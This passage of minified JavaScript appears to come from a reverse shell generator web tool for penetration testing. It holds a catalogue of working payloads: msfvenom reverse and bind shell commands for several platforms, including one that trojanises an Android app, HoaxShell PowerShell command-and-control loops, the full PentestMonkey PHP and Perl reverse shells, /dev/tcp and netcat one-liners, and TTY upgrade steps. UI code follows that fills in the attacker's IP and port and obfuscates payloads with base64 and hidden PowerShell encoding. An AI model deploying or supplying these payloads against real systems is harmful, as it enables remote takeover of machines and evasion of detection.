linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-bind-tcp-shellcode-bof",name:"Windows Bind TCP ShellCode - BOF",category:"MSFVenom",language:"Windows",platform:"Both",command:"msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\0' -f python -v notBuf -o shellcode",listener:"nc -nv {ip} {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-macos-meterpreter-staged-reverse-tcp-x64",name:"macOS Meterpreter Staged Reverse TCP (x64)",category:"MSFVenom",language:"macOS",platform:"Linux",command:"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-macos-meterpreter-stageless-reverse-tcp-x64",name:"macOS Meterpreter Stageless Reverse TCP (x64)",category:"MSFVenom",language:"macOS",platform:"Linux",command:"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-macos-stageless-reverse-tcp-x64",name:"macOS Stageless Reverse TCP (x64)",category:"MSFVenom",language:"macOS",platform:"Linux",command:"msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-php-meterpreter-stageless-reverse-tcp",name:"PHP Meterpreter Stageless Reverse TCP",category:"MSFVenom",language:"PHP",platform:"Both",command:"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-php-reverse-php",name:"PHP Reverse PHP",category:"MSFVenom",language:"PHP",platform:"Both",command:"msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-jsp-stageless-reverse-tcp",name:"JSP Stageless Reverse TCP",category:"MSFVenom",language:"Java",platform:"Both",command:"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-war-stageless-reverse-tcp",name:"WAR Stageless Reverse TCP",category:"MSFVenom",language:"Java",platform:"Both",command:"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-android-meterpreter-reverse-tcp",name:"Android Meterpreter Reverse TCP",category:"MSFVenom",language:"Android",platform:"Both",command:"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-android-meterpreter-embed-reverse-tcp",name:"Android Meterpreter Embed Reverse TCP",category:"MSFVenom",language:"Android",platform:"Both",command:"msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-apple-ios-meterpreter-reverse-tcp-inline",name:"Apple iOS Meterpreter Reverse TCP Inline",category:"MSFVenom",language:"Apple iOS",platform:"Both",command:"msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-python-stageless-reverse-tcp",name:"Python Stageless Reverse TCP",category:"MSFVenom",language:"Python",platform:"Both",command:"msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-bash-stageless-reverse-tcp",name:"Bash Stageless Reverse TCP",category:"MSFVenom",language:"Bash",platform:"Linux",command:"msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"hoax-windows-cmd-curl",name:"Windows CMD cURL",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:'@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL',listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-iex",name:"PowerShell IEX",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-iex-constr-lang-mode",name:"PowerShell IEX Constr Lang Mode",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-outfile",name:"PowerShell Outfile",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-outfile-constr-lang-mode",name:"PowerShell Outfile Constr Lang Mode",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-windows-cmd-curl-https",name:"Windows CMD cURL https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:'@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL',listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-iex-https",name:"PowerShell IEX https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-constr-lang-mode-iex-https",name:"PowerShell Constr Lang Mode IEX https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='{ip}:{port}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-outfile-https",name:"PowerShell Outfile https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"hoax-powershell-outfile-constr-lang-mode-https",name:"PowerShell Outfile Constr Lang Mode https",category:"HoaxShell",language:"HoaxShell",platform:"Windows",command:`add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,listener:"python3 hoaxshell.py -s {ip}",notes:"Windows reverse shell payload connecting over HTTP/HTTPS.",extension:".ps1",isFullScript:!1},{id:"pm-pentestmonkey-php-reverse-shell-full-file",name:"PentestMonkey PHP Reverse Shell (Full File)",category:"PentestMonkey",language:"PHP",platform:"Both",command:`<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; {shell} -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) { exit(1); }
	if ($pid) { exit(0); }
	if (posix_setsid() == -1) { exit(1); }
	$daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { exit(1); }

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { exit(1); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
	if (feof($sock) || feof($pipes[1])) { break; }
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		$input = fread($sock, $chunk_size);
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		$input = fread($pipes[1], $chunk_size);
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		$input = fread($pipes[2], $chunk_size);
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>`,listener:"nc -lvnp {port}",notes:"The legendary PentestMonkey PHP reverse shell file. Ready to save as revshell.php and upload to vulnerable web targets.",extension:".php",isFullScript:!0},{id:"pm-pentestmonkey-perl-reverse-shell-full-file",name:"PentestMonkey Perl Reverse Shell (Full File)",category:"PentestMonkey",language:"Perl",platform:"Linux",command:`#!/usr/bin/perl -w
# perl-reverse-shell - PentestMonkey Reverse Shell in PERL
use strict;
use Socket;
use FileHandle;
use POSIX;

my $ip = '{ip}';
my $port = {port};
my $daemon = 1;
my $fake_process_name = "/usr/sbin/apache";
$0 = "[httpd]";

if ($daemon) {
	my $pid = fork();
	if ($pid) { exit 0; }
	setsid();
	chdir('/');
	umask(0);
}

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port, inet_aton($ip)))) {
	open(STDIN, ">&SOCK");
	open(STDOUT, ">&SOCK");
	open(STDERR, ">&SOCK");
	$ENV{'HISTFILE'} = '/dev/null';
	system("w;uname -a;id;pwd");
	exec({"{shell}"} ($fake_process_name, "-i"));
} else {
	exit 1;
}
`,listener:"nc -lvnp {port}",notes:"Full standalone PentestMonkey Perl reverse shell script with fake process disguise [httpd].",extension:".pl",isFullScript:!0},{id:"pm-pentestmonkey-classic-bash-one-liner",name:"PentestMonkey Classic Bash One-Liner",category:"PentestMonkey",language:"Bash",platform:"Linux",command:"bash -i >& /dev/tcp/{ip}/{port} 0>&1",listener:"nc -lvnp {port}",notes:"Classic PentestMonkey cheat sheet #1 entry.",extension:".sh",isFullScript:!1},{id:"pm-pentestmonkey-classic-perl-one-liner",name:"PentestMonkey Classic Perl One-Liner",category:"PentestMonkey",language:"Perl",platform:"Linux",command:`perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'`,listener:"nc -lvnp {port}",notes:"PentestMonkey cheat sheet Perl socket one-liner.",extension:".pl",isFullScript:!1},{id:"pm-pentestmonkey-classic-python-one-liner",name:"PentestMonkey Classic Python One-Liner",category:"PentestMonkey",language:"Python",platform:"Both",command:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{shell}","-i"]);'`,listener:"nc -lvnp {port}",notes:"Classic PentestMonkey Python spawn socket.",extension:".py",isFullScript:!1},{id:"pm-pentestmonkey-classic-php-one-liner",name:"PentestMonkey Classic PHP One-Liner",category:"PentestMonkey",language:"PHP",platform:"Linux",command:`php -r '$sock=fsockopen("{ip}",{port});exec("{shell} -i <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"Standard PentestMonkey PHP descriptor redirection.",extension:".php",isFullScript:!1},{id:"pm-pentestmonkey-classic-ruby-one-liner",name:"PentestMonkey Classic Ruby One-Liner",category:"PentestMonkey",language:"Ruby",platform:"Linux",command:`ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)'`,listener:"nc -lvnp {port}",notes:"PentestMonkey TCPSocket spawner.",extension:".rb",isFullScript:!1},{id:"pm-pentestmonkey-netcat-e-flag",name:"PentestMonkey Netcat (-e flag)",category:"PentestMonkey",language:"Netcat",platform:"Linux",command:"nc -e {shell} {ip} {port}",listener:"nc -lvnp {port}",notes:"Traditional netcat execution flag.",extension:".sh",isFullScript:!1},{id:"pm-pentestmonkey-netcat-fifo-mkfifo",name:"PentestMonkey Netcat FIFO (mkfifo)",category:"PentestMonkey",language:"Netcat",platform:"Linux",command:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",listener:"nc -lvnp {port}",notes:"PentestMonkey OpenBSD netcat workaround using named pipe.",extension:".sh",isFullScript:!1},{id:"pm-pentestmonkey-java-runtime-exec",name:"PentestMonkey Java Runtime Exec",category:"PentestMonkey",language:"Java",platform:"Both",command:'r = Runtime.getRuntime(); p = r.exec(["{shell}","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor()',listener:"nc -lvnp {port}",notes:"PentestMonkey Java exec connector.",extension:".java",isFullScript:!1},{id:"pm-pentestmonkey-xterm-display-shell",name:"PentestMonkey XTerm Display Shell",category:"PentestMonkey",language:"Other",platform:"Linux",command:"xterm -display {ip}:1",listener:"Xnest :1 (or Xming on Windows)",notes:"Connects an interactive X11 terminal session back to listener.",extension:".sh",isFullScript:!1},{id:"tty-python-pty-spawn-interactive-bash",name:"Python PTY Spawn (Interactive Bash)",category:"TTY",language:"TTY Upgrade",platform:"Linux",command:`# Step 1: In the reverse shell session, spawn a PTY:
python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell:
# Press: Ctrl + Z

# Step 3: In attacker local terminal, disable echoing and bring back:
stty raw -echo; fg

# Step 4: Reset terminal type and dimensions:
reset
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 cols 116`,listener:"nc -lvnp {port}",notes:"Standard industry PTY upgrade. Gives full tab completion, Ctrl+C handling, and clear screen.",extension:".sh",isFullScript:!0},{id:"tty-script-dev-null-pty-spawn",name:"Script /dev/null PTY Spawn",category:"TTY",language:"TTY Upgrade",platform:"Linux",command:`# When python is not available, use script:
/usr/bin/script -qc /bin/bash /dev/null

# Background with Ctrl + Z, then on attacker machine:
stty raw -echo; fg
reset
export TERM=xterm-256color
export SHELL=/bin/bash`,listener:"nc -lvnp {port}",notes:"PTY allocation using Linux script utility when Python is absent.",extension:".sh",isFullScript:!0},{id:"tty-socat-full-interactive-tty",name:"Socat Full Interactive TTY",category:"TTY",language:"TTY Upgrade",platform:"Linux",command:`# Attacker listener:
socat file:\`tty\`,raw,echo=0 TCP-L:{port}

# Target reverse connection:
socat TCP:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane`,listener:"socat file:`tty`,raw,echo=0 TCP-L:{port}",notes:"Instant flawless PTY with no backgrounding or stty manipulation needed.",extension:".sh",isFullScript:!0},{id:"tty-windows-conptyshell-interactive-tty",name:"Windows ConPtyShell Interactive TTY",category:"TTY",language:"TTY Upgrade",platform:"Windows",command:`# Attacker listener setup (set rows and cols):
stty raw -echo; (stty size; cat) | nc -lvnp {port}

# Target PowerShell execution:
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}`,listener:"stty raw -echo; (stty size; cat) | nc -lvnp {port}",notes:"ConPty creates a true pseudo-console on modern Windows (Build 1809+), supporting colors, arrows, and Ctrl+C.",extension:".ps1",isFullScript:!0},{id:"tty-instant-terminal-geometry-sync",name:"Instant Terminal Geometry Sync",category:"TTY",language:"TTY Upgrade",platform:"Linux",command:`# Run on attacker terminal to get current geometry:
stty size

# In the target reverse shell, apply rows & cols:
stty rows 40 cols 140; export TERM=xterm-256color`,listener:"nc -lvnp {port}",notes:"Fixes Nano, Vim, and text wrapping issues when editing files in a reverse shell.",extension:".sh",isFullScript:!1}],Cr=["4444","443","80","9001","8080","1337"],Tr=[{id:"nc",label:"nc -lvnp"},{id:"rlwrap",label:"rlwrap nc"},{id:"ncat",label:"ncat"},{id:"ncat-ssl",label:"ncat (SSL)"},{id:"rustcat",label:"rustcat"},{id:"pwncat",label:"pwncat"},{id:"socat",label:"socat"},{id:"powercat",label:"powercat"}],Pr=({initialCategory:a})=>{const C=Be(r=>r.globalVars),B=Be(r=>r.setGlobalVars),g=Be(r=>r.soundEnabled),D=C.lhost||"10.10.14.x",L=C.lport||"4444",ne=C.targetIp,U=r=>B({lhost:r}),u=r=>B({lport:r}),[E,F]=n.useState("rev-bash-i"),[X,oe]=n.useState("/bin/bash"),[v,A]=n.useState("All"),[R,Z]=n.useState(""),[$,pe]=n.useState("RAW"),[M,Y]=n.useState("none"),[y,me]=n.useState("nc"),[W,le]=n.useState(!1),[N,ie]=n.useState(!1),w=n.useMemo(()=>Me.find(r=>r.id===E)||Me[0],[E]),V=n.useMemo(()=>{let r=Me;if(v==="Linux"?r=r.filter(o=>o.platform==="Linux"||o.platform==="Both"||o.platform==="All"):v==="Windows"?r=r.filter(o=>o.platform==="Windows"||o.platform==="Both"||o.platform==="All"):v==="Web"?r=r.filter(o=>o.language==="PHP"||o.language==="JSP"||o.language==="Node.js"||o.language==="Java"||o.name.toLowerCase().includes("php")||o.name.toLowerCase().includes("web")):v==="PentestMonkey"?r=r.filter(o=>o.category==="PentestMonkey"):v==="MSFVenom"?r=r.filter(o=>o.category==="MSFVenom"):v==="HoaxShell"?r=r.filter(o=>o.category==="HoaxShell"):v==="TTY"&&(r=r.filter(o=>o.category==="TTY")),R.trim()){const o=R.toLowerCase().trim();r=r.filter(S=>S.name.toLowerCase().includes(o)||S.language.toLowerCase().includes(o)||S.command.toLowerCase().includes(o)||S.notes&&S.notes.toLowerCase().includes(o))}return r},[v,R]),i=n.useMemo(()=>{const r=w.command.replace(/{ip}/g,D).replace(/{port}/g,L).replace(/{shell}/g,X||"/bin/bash");let o=r;if(M==="bash -c"?o=`bash -c '${r.replace(/'/g,"'\\''")}'`:M==="cmd /c"&&(o=`cmd.exe /c "${r.replace(/"/g,'"')}"`),$==="URL")return encodeURIComponent(o);if($==="BASE64")try{return btoa(unescape(encodeURIComponent(o)))}catch{return btoa(o)}else if($==="BASH_B64")try{return`echo "${btoa(unescape(encodeURIComponent(o)))}" | base64 -d | bash`}catch{return o}else if($==="PS_ENC")try{let S="";for(let H=0;H<o.length;H++)S+=o.charAt(H)+"\0";return`powershell -nop -w hidden -enc ${btoa(S)}`}catch{return o}return o},[w,D,L,X,M,$]),c=n.useMemo(()=>{const r=L;switch(y){case"nc":return`nc -lvnp ${r}`;case"rlwrap":return`rlwrap nc -lvnp ${r}`;case"ncat":return`ncat -lvnp ${r}`;case"ncat-ssl":return`ncat --ssl -lvnp ${r}`;case"rustcat":return`rcat -l -p ${r}`;case"pwncat":return`python3 -m pwncat -lp ${r}`;case"socat":return`socat file:\`tty\`,raw,echo=0 tcp-listen:${r}`;case"powercat":return`powercat -l -p ${r}`;default:return`nc -lvnp ${r}`}},[y,L]),d=r=>{const o=parseInt(L,10)||4444,S=Math.max(1,Math.min(65535,o+r));u(S.toString()),g&&p("toggle")},x=()=>{wt(i),le(!0),g&&p("flag"),setTimeout(()=>le(!1),2e3)},k=()=>{wt(c),ie(!0),g&&p("click"),setTimeout(()=>ie(!1),2e3)},j=()=>{const r=w.extension||".sh",o=`${w.name.toLowerCase().replace(/[^a-z0-9_-]+/g,"-")}${r}`,S=new Blob([i],{type:"text/plain;charset=utf-8"}),H=URL.createObjectURL(S),T=document.createElement("a");T.href=H,T.download=o,document.body.appendChild(T),T.click(),document.body.removeChild(T),URL.revokeObjectURL(H),g&&p("export")};return e.jsxs("div",{className:"space-y-3 font-mono text-xs",children:[e.jsxs("div",{className:"p-2.5 sm:p-3 rounded-xl bg-white dark:bg-cyber-card border border-slate-200 dark:border-cyber-border/80 shadow-sm flex flex-wrap items-center justify-between gap-3",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsxs("span",{className:"text-[11px] font-bold text-cyan-700 dark:text-cyber-cyan uppercase tracking-wider flex items-center gap-1",children:[e.jsx(er,{className:"w-3.5 h-3.5 text-cyan-600 dark:text-cyber-cyan"}),"LHOST:"]}),e.jsx("div",{className:"inline-flex items-center h-8 rounded-lg bg-slate-100 dark:bg-slate-950/80 border border-slate-300 dark:border-slate-800 px-2 shadow-inner focus-within:border-cyan-500 dark:focus-within:border-cyber-cyan focus-within:ring-1 focus-within:ring-cyan-500/30 transition-all",children:e.jsx("input",{type:"text",id:"revshell-lhost-input",name:"revshell-lhost","aria-label":"Reverse Shell LHOST",value:D,onChange:r=>U(r.target.value),placeholder:"10.10.14.x",className:"w-32 h-7 bg-transparent text-slate-900 dark:text-white text-xs font-mono font-bold focus:outline-none placeholder-slate-400 dark:placeholder-slate-600",title:"Attacker IP / Tun0 interface IP"})}),ne&&e.jsx("button",{type:"button",onClick:()=>{U(ne),g&&p("toggle")},className:"h-8 px-2.5 flex items-center rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-950/80 dark:hover:bg-slate-800 border border-slate-300 